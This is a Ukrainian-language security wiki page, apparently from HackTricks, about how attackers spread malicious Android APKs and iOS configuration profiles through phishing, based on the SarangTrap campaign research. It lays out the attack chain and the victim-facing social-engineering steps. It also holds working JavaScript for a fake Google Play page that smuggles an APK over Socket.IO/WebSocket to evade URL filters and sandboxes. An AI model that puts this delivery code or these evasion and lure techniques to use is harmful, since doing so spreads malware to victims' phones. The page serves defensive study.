# Мобільний фішинг і поширення шкідливих застосунків (Android і iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> На цій сторінці описано методи, які зловмисники використовують для поширення **шкідливих Android APK** і **профілів конфігурації iOS** за допомогою фішингу (SEO, соціальна інженерія, фальшиві магазини, застосунки для знайомств тощо).
> Матеріал адаптовано з дослідження кампанії SarangTrap, викритої Zimperium zLabs (2025), та інших загальнодоступних досліджень.<sup>[[1]](#references)</sup>

## Схема атаки

1. **SEO/фішингова інфраструктура**
   * Зареєструйте десятки схожих доменів (знайомства, хмарний обмін файлами, автосервіс тощо).  
     – Використовуйте ключові слова місцевою мовою й емодзі в елементі `<title>`, щоб піднятися в результатах Google.  
     – Розміщуйте інструкції зі встановлення і для Android (`.apk`), і для iOS на одній цільовій сторінці.
2. **Завантаження першого етапу**
   * Android: пряме посилання на *непідписаний* APK або APK із «стороннього магазину».  
   * iOS: посилання `itms-services://` або звичайне HTTPS-посилання на шкідливий профіль **mobileconfig** (див. нижче).
3. **Поведінка Android після встановлення**
   * Виконання, кероване C2, зловживання дозволами, обходи dropper, збір даних у фоновому режимі та інші аспекти поведінки malware після встановлення описані на окремій сторінці Android Malware Post-Exploitation нижче.
4. **Метод доставки для iOS**
   * Один **профіль мобільної конфігурації** може запитувати `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` тощо, щоб перевести пристрій під нагляд на кшталт «MDM».  
   * Інструкції із соціальної інженерії:
     1. Відкрити «Параметри» ➜ *Профіль завантажено*.
     2. Тричі натиснути *Установити* (на фішинговій сторінці є знімки екрана).  
     3. Довіритися непідписаному профілю ➜ зловмисник отримує права доступу до *Контактів* і *Фото* без перевірки App Store.
5. **Корисне навантаження iOS Web Clip (піктограма фішингового застосунку)**
   * Корисні навантаження `com.apple.webClip.managed` можуть **закріпити фішингову URL-адресу на головному екрані** з брендованою піктограмою та назвою.
   * Web Clips можуть запускатися **на весь екран** (приховуючи інтерфейс браузера) і бути позначені як **такі, що не видаляються**, змушуючи жертву видалити профіль, щоб прибрати піктограму.<sup>[[3]](#references)</sup>
6. **Мережевий рівень**
   * Звичайний HTTP, часто через порт 80 із заголовком HOST на кшталт `api.<phishingdomain>.com`.
   * `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (без TLS → легко виявити).

## Android Malware Post-Exploitation

Щоб дізнатися про методи Android malware після встановлення, зокрема C2, зловживання Accessibility, оверлеї, автоматизацію ATS, поетапне завантаження DEX, преміум-SMS і закріплення в системі, дивіться:

{{#ref}}
../basic-forensic-methodology/android-malware-post-exploitation.md
{{#endref}}

## APK Smuggling на основі Socket.IO/WebSocket + фальшиві сторінки Google Play

Зловмисники дедалі частіше замінюють статичні посилання на APK каналом Socket.IO/WebSocket, вбудованим у приманки, схожі на Google Play. Це приховує URL-адресу корисного навантаження, обходить фільтри URL-адрес і розширень та забезпечує правдоподібний процес встановлення.<sup>[[2]](#references)[[4]](#references)</sup>

Типовий клієнтський процес, виявлений у реальних атаках:

<details>
<summary>Фальшивий завантажувач Play на Socket.IO (JavaScript)</summary>

```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
  const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url; a.download = "app.apk"; a.style.display = "none";
  document.body.appendChild(a); a.click();
});
```

</details>

Чому це обходить прості засоби контролю:
- Статичну URL-адресу APK не розкрито; payload відновлюється в пам’яті з кадрів WebSocket.
- Фільтри URL/MIME/розширень, які блокують прямі відповіді .apk, можуть пропустити двійкові дані, передані через WebSockets/Socket.IO.
- Crawler-и та URL-sandbox-и, які не виконують WebSockets, не отримають payload.

Див. також WebSocket tradecraft та інструменти:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## References

- [1] [Темний бік романтики: кампанія вимагання SarangTrap](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [2] [Socket.IO](https://socket.io)
- [3] [Налаштування payload Web Clips для пристроїв Apple](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)
- [4] [Банківський троян, націлений на користувачів Android з Індонезії та В’єтнаму](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
{{#include ../../banners/hacktricks-training.md}}
